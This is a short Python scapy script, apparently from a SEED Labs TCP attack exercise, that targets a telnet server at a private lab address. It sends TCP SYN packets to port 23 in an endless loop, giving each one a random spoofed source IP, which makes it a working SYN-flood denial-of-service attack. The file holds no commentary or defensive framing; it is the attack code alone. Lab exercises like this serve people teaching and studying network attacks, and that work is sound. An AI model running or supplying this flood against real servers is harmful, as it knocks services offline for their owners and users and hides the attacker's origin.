#!/usr/bin/python3
#root@VM:/home/seed# pip list | grep scapy
#scapy (2.5.0)


from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

user="172.17.0.2"
server="172.17.0.3"
attacker="172.17.0.4"


a = IP(dst=server)
b = TCP(sport=1551, dport=23, seq=1551, flags='S')
pkt = a/b
while True:
 pkt['IP'].src = str(IPv4Address(getrandbits(32)))
 send(pkt, verbose = 0)
